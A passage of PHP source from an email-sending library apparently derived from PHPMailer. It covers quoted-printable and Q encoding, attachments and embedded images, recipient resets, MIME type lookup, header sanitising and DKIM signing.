		$hex = array('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
		$lines = preg_split('/(?:\r\n|\r|\n)/', $input);
		$eol = "\r\n";
		$escape = '=';
		$output = '';
		while( list(, $line) = each($lines) ) {
			$linlen = strlen($line);
			$newline = '';
			for($i = 0; $i < $linlen; $i++) {
				$c = substr( $line, $i, 1 );
				$dec = ord( $c );
				if ( ( $i == 0 ) && ( $dec == 46 ) ) { // convert first point in the line into =2E
					$c = '=2E';
				}
				if ( $dec == 32 ) {
					if ( $i == ( $linlen - 1 ) ) { // convert space at eol only
						$c = '=20';
					} else if ( $space_conv ) {
						$c = '=20';
					}
				} elseif ( ($dec == 61) || ($dec < 32 ) || ($dec > 126) ) { // always encode "\t", which is *not* required
					$h2 = floor($dec/16);
					$h1 = floor($dec%16);
					$c = $escape.$hex[$h2].$hex[$h1];
				}
				if ( (strlen($newline) + strlen($c)) >= $line_max ) { // CRLF is not counted
					$output .= $newline.$escape.$eol; //  soft line break; " =\r\n" is okay
					$newline = '';
					// check if newline first character will be point or not
					if ( $dec == 46 ) {
						$c = '=2E';
					}
				}
				$newline .= $c;
			} // end of for
			$output .= $newline.$eol;
		} // end of while
		return $output;
	}

	/**
	 * Encode string to q encoding.
	 * @access private
	 * @return string
	 */
	function EncodeQ ($str, $position = 'text') {
		/* There should not be any EOL in the string */
		$encoded = preg_replace("[\r\n]", '', $str);

		switch (strtolower($position)) {
			case 'phrase':
				$encoded = preg_replace("/([^A-Za-z0-9!*+\/ -])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);
				break;
			case 'comment':
				$encoded = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('\\1'))", $encoded);
			case 'text':
			default:
				/* Replace every high ascii, control =, ? and _ characters */
				$encoded = preg_replace('/([\000-\011\013\014\016-\037\075\077\137\177-\377])/e',
							"'='.sprintf('%02X', ord('\\1'))", $encoded);
				break;
		}

		/* Replace every spaces to _ (more readable than =20) */
		$encoded = str_replace(' ', '_', $encoded);

		return $encoded;
	}

	/**
	 * Adds a string or binary attachment (non-filesystem) to the list.
	 * This method can be used to attach ascii or binary data,
	 * such as a BLOB record from a database.
	 * @param string $string String attachment data.
	 * @param string $filename Name of the attachment.
	 * @param string $encoding File encoding (see $Encoding).
	 * @param string $type File extension (MIME) type.
	 * @return void
	 */
	function AddStringAttachment($string, $filename, $encoding = 'base64', $type = 'application/octet-stream') {
		/* Append to $attachment array */
		$cur = count($this->attachment);
		$this->attachment[$cur][0] = $string;
		$this->attachment[$cur][1] = $filename;
		$this->attachment[$cur][2] = $filename;
		$this->attachment[$cur][3] = $encoding;
		$this->attachment[$cur][4] = $type;
		$this->attachment[$cur][5] = true; // isString
		$this->attachment[$cur][6] = 'attachment';
		$this->attachment[$cur][7] = 0;
	}

	/**
	 * Adds an embedded attachment.  This can include images, sounds, and
	 * just about any other document.  Make sure to set the $type to an
	 * image type.  For JPEG images use "image/jpeg" and for GIF images
	 * use "image/gif".
	 * @param string $path Path to the attachment.
	 * @param string $cid Content ID of the attachment.  Use this to identify
	 *        the Id for accessing the image in an HTML form.
	 * @param string $name Overrides the attachment name.
	 * @param string $encoding File encoding (see $Encoding).
	 * @param string $type File extension (MIME) type.
	 * @return bool
	 */
	function AddEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {

		if(!@is_file($path)) {
			$this->SetError('file_access', $path);
			return false;
		}

		$filename = basename($path);
		if($name == '') {
			$name = $filename;
		}

		/* Append to $attachment array */
		$cur = count($this->attachment);
		$this->attachment[$cur][0] = $path;
		$this->attachment[$cur][1] = $filename;
		$this->attachment[$cur][2] = $name;
		$this->attachment[$cur][3] = $encoding;
		$this->attachment[$cur][4] = $type;
		$this->attachment[$cur][5] = false;
		$this->attachment[$cur][6] = 'inline';
		$this->attachment[$cur][7] = $cid;

		return true;
	}

	/**
	 * Returns true if an inline attachment is present.
	 * @access private
	 * @return bool
	 */
	function InlineImageExists() {
		$result = false;
		for($i = 0; $i < count($this->attachment); $i++) {
			if($this->attachment[$i][6] == 'inline') {
				$result = true;
				break;
			}
		}

		return $result;
	}

	/////////////////////////////////////////////////
	// CLASS METHODS, MESSAGE RESET
	/////////////////////////////////////////////////

	/**
	 * Clears all recipients assigned in the TO array.  Returns void.
	 * @return void
	 */
	function ClearAddresses() {
		$this->to = array();
	}

	/**
	 * Clears all recipients assigned in the CC array.  Returns void.
	 * @return void
	 */
	function ClearCCs() {
		$this->cc = array();
	}

	/**
	 * Clears all recipients assigned in the BCC array.  Returns void.
	 * @return void
	 */
	function ClearBCCs() {
		$this->bcc = array();
	}

	/**
	 * Clears all recipients assigned in the ReplyTo array.  Returns void.
	 * @return void
	 */
	function ClearReplyTos() {
		$this->ReplyTo = array();
	}

	/**
	 * Clears all recipients assigned in the TO, CC and BCC
	 * array.  Returns void.
	 * @return void
	 */
	function ClearAllRecipients() {
		$this->to = array();
		$this->cc = array();
		$this->bcc = array();
	}

	/**
	 * Clears all previously set filesystem, string, and binary
	 * attachments.  Returns void.
	 * @return void
	 */
	function ClearAttachments() {
		$this->attachment = array();
	}

	/**
	 * Clears all custom headers.  Returns void.
	 * @return void
	 */
	function ClearCustomHeaders() {
		$this->CustomHeader = array();
	}

	/////////////////////////////////////////////////
	// CLASS METHODS, MISCELLANEOUS
	/////////////////////////////////////////////////

	/**
	 * Adds the error message to the error container.
	 * Returns void.
	 * @access private
	 * @return void
	 */
	function SetError($msg) {
		$this->error_count++;
		$this->ErrorInfo = $msg;
	}

	/**
	 * Returns the proper RFC 822 formatted date.
	 * @access private
	 * @return string
	 */
	function RFCDate() {
		$tz = @date('Z');
		$tzs = ($tz < 0) ? '-' : '+';
		$tz = abs($tz);
		$tz = (int)($tz/3600)*100 + ($tz%3600)/60;
		$result = sprintf("%s %s%04d", @date('D, j M Y H:i:s'), $tzs, $tz);

		return $result;
	}

	/**
	 * Returns the appropriate server variable.  Should work with both
	 * PHP 4.1.0+ as well as older versions.  Returns an empty string
	 * if nothing is found.
	 * @access private
	 * @return mixed
	 */
	function ServerVar($varName) {
		global $HTTP_SERVER_VARS;
		global $HTTP_ENV_VARS;

		if(!isset($_SERVER)) {
			$_SERVER = $HTTP_SERVER_VARS;
			if(!isset($_SERVER['REMOTE_ADDR'])) {
				$_SERVER = $HTTP_ENV_VARS; // must be Apache
			}
		}

		if(isset($_SERVER[$varName])) {
			return $_SERVER[$varName];
		} else {
			return '';
		}
	}

	/**
	 * Returns the server hostname or 'localhost.localdomain' if unknown.
	 * @access private
	 * @return string
	 */
	function ServerHostname() {
		if ($this->Hostname != '') {
			$result = $this->Hostname;
		} elseif ($this->ServerVar('SERVER_NAME') != '') {
			$result = $this->ServerVar('SERVER_NAME');
		} else {
			$result = 'localhost.localdomain';
		}

		return $result;
	}

	/**
	 * Returns a message in the appropriate language.
	 * @access private
	 * @return string
	 */
	function Lang($key) {
		if(count($this->language) < 1) {
			$this->SetLanguage('en'); // set the default language
		}

		if(isset($this->language[$key])) {
			return $this->language[$key];
		} else {
			return 'Language string failed to load: ' . $key;
		}
	}

	/**
	 * Returns true if an error occurred.
	 * @return bool
	 */
	function IsError() {
		return ($this->error_count > 0);
	}

	/**
	 * Changes every end of line from CR or LF to CRLF.
	 * @access private
	 * @return string
	 */
	function FixEOL($str) {
		$str = str_replace("\r\n", "\n", $str);
		$str = str_replace("\r", "\n", $str);
		$str = str_replace("\n", $this->LE, $str);
		return $str;
	}

	/**
	 * Adds a custom header.
	 * @return void
	 */
	function AddCustomHeader($custom_header) {
		$this->CustomHeader[] = explode(':', $custom_header, 2);
	}

	/**
	 * Evaluates the message and returns modifications for inline images and backgrounds
	 * @access public
	 * @return $message
	 */
	function MsgHTML($message,$basedir='') {
		preg_match_all("/(src|background)=\"(.*)\"/Ui", $message, $images);
		if(isset($images[2])) {
			foreach($images[2] as $i => $url) {
				// do not change urls for absolute images (thanks to corvuscorax)
				if (!preg_match('/^[A-z][A-z]*:\/\//',$url)) {
					$filename = basename($url);
					$directory = dirname($url);
					($directory == '.')?$directory='':'';
					$cid = 'cid:' . md5($filename);
					$fileParts = split("\.", $filename);
					$ext = $fileParts[1];
					$mimeType = $this->_mime_types($ext);
					if ( strlen($basedir) > 1 && substr($basedir,-1) != '/') { $basedir .= '/'; }
					if ( strlen($directory) > 1 && substr($directory,-1) != '/') { $directory .= '/'; }
					if ( $this->AddEmbeddedImage($basedir.$directory.$filename, md5($filename), $filename, 'base64',$mimeType) ) {
						$message = preg_replace("/".$images[1][$i]."=\"".preg_quote($url, '/')."\"/Ui", $images[1][$i]."=\"".$cid."\"", $message);
					}
				}
			}
		}
		$this->IsHTML(true);
		$this->Body = $message;
		$textMsg = trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/s','',$message)));
		if ( !empty($textMsg) && empty($this->AltBody) ) {
			$this->AltBody = html_entity_decode($textMsg);
		}
		if ( empty($this->AltBody) ) {
			$this->AltBody = 'To view this email message, open the email in with HTML compatibility!' . "\n\n";
		}
	}

	/**
	 * Gets the mime type of the embedded or inline image
	 * @access private
	 * @return mime type of ext
	 */
	function _mime_types($ext = '') {
		$mimes = array(
			'ai'    =>  'application/postscript',
			'aif'   =>  'audio/x-aiff',
			'aifc'  =>  'audio/x-aiff',
			'aiff'  =>  'audio/x-aiff',
			'avi'   =>  'video/x-msvideo',
			'bin'   =>  'application/macbinary',
			'bmp'   =>  'image/bmp',
			'class' =>  'application/octet-stream',
			'cpt'   =>  'application/mac-compactpro',
			'css'   =>  'text/css',
			'dcr'   =>  'application/x-director',
			'dir'   =>  'application/x-director',
			'dll'   =>  'application/octet-stream',
			'dms'   =>  'application/octet-stream',
			'doc'   =>  'application/msword',
			'dvi'   =>  'application/x-dvi',
			'dxr'   =>  'application/x-director',
			'eml'   =>  'message/rfc822',
			'eps'   =>  'application/postscript',
			'exe'   =>  'application/octet-stream',
			'gif'   =>  'image/gif',
			'gtar'  =>  'application/x-gtar',
			'htm'   =>  'text/html',
			'html'  =>  'text/html',
			'jpe'   =>  'image/jpeg',
			'jpeg'  =>  'image/jpeg',
			'jpg'   =>  'image/jpeg',
			'hqx'   =>  'application/mac-binhex40',
			'js'    =>  'application/x-javascript',
			'lha'   =>  'application/octet-stream',
			'log'   =>  'text/plain',
			'lzh'   =>  'application/octet-stream',
			'mid'   =>  'audio/midi',
			'midi'  =>  'audio/midi',
			'mif'   =>  'application/vnd.mif',
			'mov'   =>  'video/quicktime',
			'movie' =>  'video/x-sgi-movie',
			'mp2'   =>  'audio/mpeg',
			'mp3'   =>  'audio/mpeg',
			'mpe'   =>  'video/mpeg',
			'mpeg'  =>  'video/mpeg',
			'mpg'   =>  'video/mpeg',
			'mpga'  =>  'audio/mpeg',
			'oda'   =>  'application/oda',
			'pdf'   =>  'application/pdf',
			'php'   =>  'application/x-httpd-php',
			'php3'  =>  'application/x-httpd-php',
			'php4'  =>  'application/x-httpd-php',
			'phps'  =>  'application/x-httpd-php-source',
			'phtml' =>  'application/x-httpd-php',
			'png'   =>  'image/png',
			'ppt'   =>  'application/vnd.ms-powerpoint',
			'ps'    =>  'application/postscript',
			'psd'   =>  'application/octet-stream',
			'qt'    =>  'video/quicktime',
			'ra'    =>  'audio/x-realaudio',
			'ram'   =>  'audio/x-pn-realaudio',
			'rm'    =>  'audio/x-pn-realaudio',
			'rpm'   =>  'audio/x-pn-realaudio-plugin',
			'rtf'   =>  'text/rtf',
			'rtx'   =>  'text/richtext',
			'rv'    =>  'video/vnd.rn-realvideo',
			'sea'   =>  'application/octet-stream',
			'shtml' =>  'text/html',
			'sit'   =>  'application/x-stuffit',
			'so'    =>  'application/octet-stream',
			'smi'   =>  'application/smil',
			'smil'  =>  'application/smil',
			'swf'   =>  'application/x-shockwave-flash',
			'tar'   =>  'application/x-tar',
			'text'  =>  'text/plain',
			'txt'   =>  'text/plain',
			'tgz'   =>  'application/x-tar',
			'tif'   =>  'image/tiff',
			'tiff'  =>  'image/tiff',
			'wav'   =>  'audio/x-wav',
			'wbxml' =>  'application/vnd.wap.wbxml',
			'wmlc'  =>  'application/vnd.wap.wmlc',
			'word'  =>  'application/msword',
			'xht'   =>  'application/xhtml+xml',
			'xhtml' =>  'application/xhtml+xml',
			'xl'    =>  'application/excel',
			'xls'   =>  'application/vnd.ms-excel',
			'xml'   =>  'text/xml',
			'xsl'   =>  'text/xml',
			'zip'   =>  'application/zip'
		);
		return ( ! isset($mimes[strtolower($ext)])) ? 'application/octet-stream' : $mimes[strtolower($ext)];
	}

	/**
	 * Set (or reset) Class Objects (variables)
	 *
	 * Usage Example:
	 * $page->set('X-Priority', '3');
	 *
	 * @access public
	 * @param string $name Parameter Name
	 * @param mixed $value Parameter Value
	 * NOTE: will not work with arrays, there are no arrays to set/reset
	 */
	function set ( $name, $value = '' ) {
		if ( isset($this->$name) ) {
			$this->$name = $value;
		} else {
			$this->SetError('Cannot set or reset variable ' . $name);
			return false;
		}
	}

	/**
	 * Read a file from a supplied filename and return it.
	 *
	 * @access public
	 * @param string $filename Parameter File Name
	 */
	function getFile($filename) {
		$return = '';
		if ($fp = fopen($filename, 'rb')) {
			while (!feof($fp)) {
				$return .= fread($fp, 1024);
			}
			fclose($fp);
			return $return;
		} else {
			return false;
		}
	}

	/**
	 * Strips newlines to prevent header injection.
	 * @access private
	 * @param string $str String
	 * @return string
	 */
	function SecureHeader($str) {
		$str = trim($str);
		$str = str_replace("\r", "", $str);
		$str = str_replace("\n", "", $str);
		return $str;
	}

	/**
	 * Set the private key file and password to sign the message.
	 *
	 * @access public
	 * @param string $key_filename Parameter File Name
	 * @param string $key_pass Password for private key
	 */
	function Sign($cert_filename, $key_filename, $key_pass) {
		$this->sign_cert_file = $cert_filename;
		$this->sign_key_file = $key_filename;
		$this->sign_key_pass = $key_pass;
	}

	/**
	 * Generate DKIM signature
	 *
	 * @access public
	 * @param string $s Header
	 */
	function DKIM_Sign($s) {
		if (!empty($this->DKIM_passphrase)) {
			$privKey = openssl_pkey_get_private($this->DKIM_private,$this->DKIM_passphrase);
		} else {
			$privKey = $this->DKIM_private;
		}
		$signature = '';
		if (openssl_sign($s, $signature, $privKey)) {
			return base64_encode($signature);
		}
	}

	/**
	 * Generate DKIM Canonicalization Header
	 *
	 * @access public
	 * @param string $s Header
	 */
	function DKIM_HeaderC($s) {
		$s=preg_replace("/\r\n\s+/"," ",$s);
		$lines=explode("\r\n",$s);
		foreach ($lines as $key=>$line) {
			list($heading,$value)=explode(":",$line,2);
			$heading=strtolower($heading);
			$value=preg_replace("/\s+/"," ",$value) ; // Compress useless spaces
			$lines[$key]=$heading.":".trim($value) ; // Don't forget to remove WSP around the value
		}
		$s=implode("\r\n",$lines);
		return $s;
	}

	/**
	 * Generate DKIM Canonicalization Body
	 *
	 * @access public
	 * @param string $body Message Body
	 */
	function DKIM_BodyC($body) {
		if ($body == '') return "\r\n";
		// stabilize line endings
		$body=str_replace("\r\n","\n",$body);
		$body=str_replace("\n","\r\n",$body);
		// END stabilize line endings
		while (substr($body,strlen($body)-4,4) == "\r\n\r\n") {
			$body=substr($body,0,strlen($body)-2);
		}
		//You don't need that anymore
//	if(in_array($this->message_type,array('alt','attachments','alt_attachments')) AND substr($body,0,2) != "\r\n"){
//		$body = "\r\n".$body;
//	}
		return $body;
	}

	/**
	 * Create the DKIM header, body, as new header
	 *
	 * @access public
	 * @param string $body Body
	 */
	function DKIM_Add($body) {
		$DKIMsignatureType    = 'rsa-sha1'; // Signature & hash algorithms
		$DKIMcanonicalization = 'relaxed/simple'; // Canonicalization of header/body
		$DKIMquery            = 'dns/txt'; // Query method
		$DKIMtime             = time() ; // Signature Timestamp = seconds since 00:00:00 - Jan 1, 1970 (UTC time zone)

		//Fix acymailing 28/02/2010: not only for the mail type, it solved an issue with smtp server and special char...
		//if($this->Mailer == 'mail')...
		$subject = $this->EncodeHeader($this->SecureHeader($this->Subject));

		$subjecta_header       = "Subject: $subject";
		$from = array();
		$from[0][0] = trim($this->From);
		$from[0][1] = $this->FromName;
		$fromc_header = $this->AddrAppend('From', $from);
		$toy_header = $this->AddrAppend('To', $this->to);

		$body     = $this->DKIM_BodyC($body);
		$DKIMlen  = strlen($body) ; // Length of body
		$DKIMb64  = base64_encode(pack("H*", sha1($body))) ; // Base64 of packed binary SHA-1 hash of body
		$ident    = (empty($this->DKIM_identity))? '' : " i=" . $this->DKIM_identity . ";";
		$dkimhdrs = "DKIM-Signature: v=1; a=" . $DKIMsignatureType . "; q=" . $DKIMquery . "; l=" . $DKIMlen . "; s=" . $this->DKIM_selector . ";\r\n".
								"\tt=" . $DKIMtime . "; c=" . $DKIMcanonicalization . "; h=from:to:subject;\r\n".
								"\td=" . $this->DKIM_domain . ";" . $ident ." bh=" . $DKIMb64 . ";\r\n".
								"\tb=";
		$toSign   = $this->DKIM_HeaderC($fromc_header . "\r\n" . $toy_header . "\r\n" . $subjecta_header . "\r\n" . $dkimhdrs);
		$signed   = wordwrap($this->DKIM_Sign($toSign),60,"\r\n\t",true);
		if(empty($signed)) return '';
		return $dkimhdrs.$signed."\r\n";
	}

}